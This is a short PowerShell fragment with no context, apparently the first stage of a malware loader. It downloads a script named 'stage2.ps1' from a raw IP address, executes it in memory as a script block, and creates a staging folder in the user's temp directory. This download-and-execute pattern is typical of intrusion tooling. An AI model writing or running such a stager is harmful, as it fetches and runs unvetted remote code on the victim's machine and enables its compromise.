
$RemoteScript = (iwr "http://198.51.100.111/stage2.ps1" -UseBasicParsing).Content
[ScriptBlock]::Create($RemoteScript).Invoke()
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
